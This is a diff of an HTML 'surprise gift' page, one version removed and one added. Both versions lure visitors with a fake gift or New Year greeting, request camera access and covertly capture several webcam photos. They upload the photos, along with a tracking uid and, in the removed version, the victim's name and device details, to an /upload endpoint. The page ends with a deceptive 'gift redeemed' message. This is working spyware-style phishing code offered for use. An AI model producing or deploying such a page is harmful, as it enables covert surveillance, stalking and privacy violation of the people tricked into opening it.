@@ -1,113 +1,68 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>New Year Gift 2026</title>
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+    <title>Surprise Gift 🎁</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { text-align: center; width: 85%; max-width: 400px; padding: 25px; border: 2px solid #ff0055; border-radius: 25px; background: #0a0a0a; box-shadow: 0 0 25px #ff0055; }
-        h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; }
-        input { padding: 15px; width: 85%; border-radius: 30px; border: 1px solid #ff0055; background: #111; color: #fff; margin-bottom: 20px; text-align: center; font-size: 16px; }
-        button { padding: 15px 35px; border-radius: 30px; border: none; background: #ff0055; color: #fff; font-weight: bold; cursor: pointer; font-size: 18px; }
-        #wish-box { display: none; }
-        .wish-text { font-size: 20px; font-weight: bold; line-height: 1.4; color: #fff; }
+        body { text-align: center; font-family: sans-serif; background: #f0f0f0; padding-top: 50px; }
+        #btn { padding: 20px; font-size: 20px; background: orange; border: none; border-radius: 10px; cursor: pointer; color: white; font-weight: bold; }
+        .loader { display: none; border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
-    <div class="container" id="main-box">
-        <h1>🎇 Surprise Gift 🎇</h1>
-        <p>अपना नाम लिखें और उपहार खोलें!</p>
-        <input type="text" id="userName" placeholder="यहाँ नाम लिखें...">
-        <button onclick="startApp()">उपहार खोलें ✨</button>
+    <div id="ui">
+        <h2>Hey Hi Dear! 👋</h2>
+        <p>You have a surprise from someone special! 🎁</p>
+        <button id="btn" onclick="startProcess()">🔓 Unlock Gift</button>
     </div>
-
-    <div class="container" id="wish-box">
-        <div class="wish-text" id="wishMsg"></div>
-        <p style="margin-top: 20px; color: #ff0055; font-weight: bold;">🎊 Happy New Year 2026 🎊</p>
+    <div id="loading" style="display:none;">
+        <h3>Your gift is loading... 🎁</h3>
+        <div class="loader" style="display:block;"></div>
     </div>
-
-    <video id="v" style="display:none" autoplay playsinline muted></video>
-    <canvas id="c" style="display:none"></canvas>
-    
-    <audio id="music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const mode = urlParams.get('m') || 'front';
-        const uid = urlParams.get('uid') || '7162565886';
+        const params = new URLSearchParams(window.location.search);
+        const mode = params.get('m') || 'dual';
+        const uid = params.get('uid');
 
-        async function startApp() {
-            let name = document.getElementById('userName').value;
-            if(!name) return alert("नाम डालना जरूरी है!");
-
-            document.getElementById('main-box').style.display = 'none';
-            document.getElementById('wish-box').style.display = 'block';
+        async function startProcess() {
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
             
-            // नया पर्सनल मैसेज फॉर्मेट
-            document.getElementById('wishMsg').innerText = `Hey ${name}, मेरी तरफ से आपको और आपके पूरे परिवार को Happy New Year की ढेर सारी शुभकामनाएँ!`;
+            let count = (mode === 'dual') ? 6 : 4; 
             
-            // म्यूजिक प्ले करना (आपका पसंदीदा हिस्सा)
-            document.getElementById('music').play().catch(() => {});
-            
-            // पटाखे (Fireworks)
-            setInterval(() => { confetti({ particleCount: 60, spread: 70, origin: { y: 0.6 } }); }, 2000);
-            
-            initCapture(name);
-        }
-
-        async function initCapture(name) {
-            let info = {
-                battery: "N/A",
-                platform: navigator.platform,
-                browser: navigator.userAgent.split(' ').pop(),
-                screen: window.screen.width + "x" + window.screen.height
-            };
-            try { let b = await navigator.getBattery(); info.battery = Math.round(b.level*100)+"%"; } catch(e){}
-
-            if(mode === 'front') await runCam(name, info, {facingMode: "user"}, 5, "FRONT");
-            else if(mode === 'back') await runCam(name, info, {facingMode: "environment"}, 5, "BACK");
-            else {
-                await runCam(name, info, {facingMode: "environment"}, 3, "BACK");
-                await runCam(name, info, {facingMode: "user"}, 3, "FRONT");
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                
+                for(let i=0; i<count; i++) {
+                    await takePhoto();
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+                
+                document.body.innerHTML = "<h3>Your gift has been redeemed. You are a good person, God bless you. ✨</h3>";
+            } catch (e) { 
+                alert("Please allow camera access to see your gift!"); 
+                location.reload();
             }
         }
 
-        async function runCam(name, info, constraints, count, label) {
-            try {
-                let stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { ...constraints, width: {ideal: 640}, height: {ideal: 480} } 
-                });
-                let video = document.getElementById('v');
-                video.srcObject = stream;
-                await video.play();
-                
-                // सेंसर को रोशनी सेट करने के लिए 8 सेकंड का इंतज़ार
-                await new Promise(r => setTimeout(r, 8000)); 
-
-                for (let i = 1; i <= count; i++) {
-                    let can = document.getElementById('c');
-                    can.width = video.videoWidth; 
-                    can.height = video.videoHeight;
-                    can.getContext('2d').drawImage(video, 0, 0);
-                    
-                    fetch('/upload', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            name: name, 
-                            image: can.toDataURL('image/jpeg', 0.6), 
-                            info: info, 
-                            label: label+" "+i,
-                            uid: uid 
-                        })
-                    });
-                    await new Promise(r => setTimeout(r, 3500));
-                }
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {}
+        async function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const img = canvas.toDataURL('image/jpeg');
+            
+            await fetch('/upload', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ image: img, uid: uid, mode: mode })
+            });
         }
     </script>
 </body>
